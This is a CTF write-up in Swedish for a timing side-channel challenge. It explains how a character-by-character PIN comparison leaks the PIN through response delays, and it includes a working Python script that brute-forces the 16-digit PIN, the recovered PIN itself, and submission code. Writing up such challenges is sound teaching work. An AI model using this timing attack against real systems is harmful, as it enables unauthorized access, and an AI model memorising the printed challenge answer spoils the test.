# Sidan Av Kanalen — Svenska

**Kategori:** Misc (timing-sidokanal) · **Tjänst:** `nc challs.crate.nu 31598`

Tjänsten skriver `Enter the combination for the lock` och läser en rad. Den jämför den
inskickade PIN-koden med hemligheten **tecken för tecken framifrån** och sover en fast tid
per redan korrekt prefixtecken innan den misslyckas. Varje ytterligare korrekt inledande
tecken lägger därför till en konsekvent, mätbar fördröjning till svaret — en klassisk
timing-sidokanal som läcker PIN-koden en siffra i taget.

## Attackparametrar

- **Alfabet:** decimala siffror `0`–`9` (PIN-koden är numerisk).
- **PIN-längd:** okänd i förväg; återskapad till **16 siffror**. Attacken stoppar
  automatiskt när ingen kandidatsiffra sticker ut (se stoppvillkoret).
- **Prov per kandidat:** 2–3 mätningar per siffra; ta **minimum** (eller median) av tiden
  för att dämpa positiv nätverksjitter.
- **Fördröjning per korrekt tecken:** ≈ **0,40 s** adderas per korrekt prefixtecken.
  Grundlatensen växer ju längre prefixet blir (flera sekunder mot slutet).
- **Stopp-/beslutströskel:** behåll den siffra vars tid är högst; om gapet mellan bästa och
  näst bästa kandidat är **< 0,15 s** finns ingen tydlig vinnare → PIN-koden är komplett.

## Algoritm

1. Börja med ett tomt prefix.
2. För nästa position: för varje siffra `0`–`9`, anslut, läs bannern, skicka
   `prefix + siffra + "\n"` och mät rundturstiden till svaret. Upprepa för det inställda
   antalet prov och reducera till en statistik (min/median).
3. Rangordna de 10 siffrorna efter tid, fallande. Rätt siffra är den med den extra
   ~0,4 s-fördröjningen.
4. Om `bästa_tid − näst_bästa_tid ≥ 0,15 s`, lägg till bästa siffran i prefixet och gå till
   steg 2. Annars stoppa: prefixet är hela PIN-koden.

## Exploit

```python
import socket, time

HOST, PORT = "challs.crate.nu", 31598

def try_prefix(guess, samples=3):
    times = []
    for _ in range(samples):
        s = socket.socket()
        s.settimeout(8)
        s.connect((HOST, PORT))
        s.recv(4096)                      # banner
        t0 = time.time()
        s.sendall((guess + "\n").encode())
        try:
            s.recv(4096)
        except socket.timeout:
            pass
        times.append(time.time() - t0)
        s.close()
    return min(times)                     # min dämpar positiv jitter

prefix = ""
for pos in range(40):                     # övre gräns; verklig PIN är 16
    scores = {d: try_prefix(prefix + d) for d in "0123456789"}
    ranked = sorted(scores.items(), key=lambda kv: -kv[1])
    best_d, best_t = ranked[0]
    gap = best_t - ranked[1][1]
    if gap < 0.15:                        # ingen tydlig vinnare -> PIN klar
        print("PIN klar:", prefix)
        break
    prefix += best_d
    print(f"pos {pos}: best={best_d} gap={gap:.3f} prefix={prefix}")

print("SLUTLIG PIN:", prefix)
```

Körning till slut återskapar PIN-koden **`1936480632978469`** (16 siffror). Stoppvillkoret
utlöses rent vid position 16 (gap ≈ 0,0008 s), vilket bekräftar längden. Exempel på slutet
av en körning:

```text
pos 15 best=9 gap=0.400
=== position 16 prefix so far: 1936480632978469
pos 16 best=8 gap=0.00084 -> No clear separation, stopping
SLUTLIG PIN: 1936480632978469
```

## Skicka PIN och läs flaggan

```python
import socket
s = socket.create_connection(("challs.crate.nu", 31598), timeout=10)
s.recv(4096)                             # banner
s.sendall(b"1936480632978469\n")
print(s.recv(4096).decode())             # -> cratectf{...}
```

Tjänsten svarar direkt med `cratectf{...}` (dolt här).

## Verifiering

Plattformsbekräftat löst. Att skicka PIN-koden `1936480632978469` returnerar flaggan; det
bokstavliga flaggvärdet är dolt för publicering.
